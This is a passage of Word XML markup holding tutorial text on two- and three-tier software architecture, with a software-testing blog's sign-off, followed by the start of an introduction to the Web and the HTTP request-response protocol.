            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> validation of data, calculations, data insertion etc. This acts as </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>a</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> interface between Client layer and Data Access Layer. This layer is also called the intermediary layer helps to make communication faster between client and data layer.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1414" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1415" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>3) Data layer:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1416" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1417" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>In this layer actual database is comes in the picture. Data Access Layer contains methods to connect with database and to perform insert, update, delete, get data from database based on our input data.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F3F3F3"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="1418" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:noProof/>
          <w:color w:val="A90000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4688205" cy="3009265"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="92" name="Picture 92" descr="Three-tier Architecture">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ree-tier Architecture">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88205" cy="3009265"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="wp-caption-text"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F3F3F3"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="195" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="1419" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="666666"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1420" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="666666"/>
            <w:sz w:val="16"/>
            <w:szCs w:val="16"/>
          </w:rPr>
          <w:t>Three-tier Architecture</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1421" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1422" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Advantages</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="200"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="1423" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1424" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>High performance, lightweight persistent objects</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="200"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="1425" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1426" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Scalability – Each tier can scale horizontally</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="200"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="1427" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1428" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Performance – Because the Presentation tier can cache requests, network utilization is minimized, and the load is reduced on the Application and Data tiers.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="200"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="1429" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1430" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>High degree of flexibility in deployment platform and configuration</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="200"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="1431" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1432" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Better Re-use</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="200"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="1433" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1434" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Improve Data Integrity</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="200"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="1435" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1436" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Improved Security – Client is not direct access to database.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="200"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="1437" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1438" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Easy to maintain and modification is bit easy, won’t affect other modules</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="200"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="1439" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1440" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>In three tier architecture application performance is good.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1441" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1442" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Disadvantages</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="201"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="1443" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1444" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Increase Complexity/Effort</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1445" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1446" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>This is the common Question asked in the Interview. Hope this article helped you understanding Two-Tier and Three-Tier Architecture with example.</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
          <w:t>Thanks and Happy Testing!!!</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1447" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1448" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>I think this will have an idea of two-tier and three-tier architecture. To get software testing articles in your inbox click here to </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://feedburner.google.com/fb/a/mailverify?uri=SoftwareTestingClass&amp;loc=en_US" \t "_blank" </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="A90000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Subscribe with your email address</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> link. Also I would like all of you to please join this discussion and add more valuable points to it. Thanks.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="240"/>
        <w:rPr>
          <w:ins w:id="1449" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1450" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
          </w:rPr>
          <w:t>Share this:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="004C44FA"/>
    <w:p w:rsidR="007870C7" w:rsidRDefault="007870C7" w:rsidP="004C44FA"/>
    <w:p w:rsidR="007870C7" w:rsidRDefault="007870C7" w:rsidP="004C44FA"/>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:spacing w:before="0" w:line="357" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="0075A2"/>
          <w:spacing w:val="15"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="0075A2"/>
          <w:spacing w:val="15"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>The WEB</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Internet (or The Web) is a massive distributed client/server information system as depicted in the following diagram.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5191133" cy="2686346"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="31744" name="Picture 31744" descr="https://www.ntu.edu.sg/home/ehchua/programming/webprogramming/images/The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ntu.edu.sg/home/ehchua/programming/webprogramming/images/TheWe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95099" cy="2688398"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>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Many applications are running concurrently over the Web, such as web browsing/surfing, e-mail, file transfer, audio &amp; video streaming, and so on.  In order for proper communication to take place between the client and the server, these applications must agree on a specific application-level protocol such as HTTP, FTP, SMTP, POP, and etc.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:spacing w:before="0" w:line="357" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="0075A2"/>
          <w:spacing w:val="15"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="0075A2"/>
          <w:spacing w:val="15"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>HyperText</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="0075A2"/>
          <w:spacing w:val="15"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> Transfer Protocol (HTTP)</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HTTP (Hypertext Transfer Protocol) is perhaps the most popular application protocol used in the Internet (or The WEB).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="202"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="432"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HTTP is an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>asymmetric request-response client-server</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> protocol as illustrated.  An HTTP client sends a request message to an HTTP server.  The server, in turn, returns a response message.  In other words, HTTP is a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">pull </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>protocol</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> the client </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>pulls</w:t>
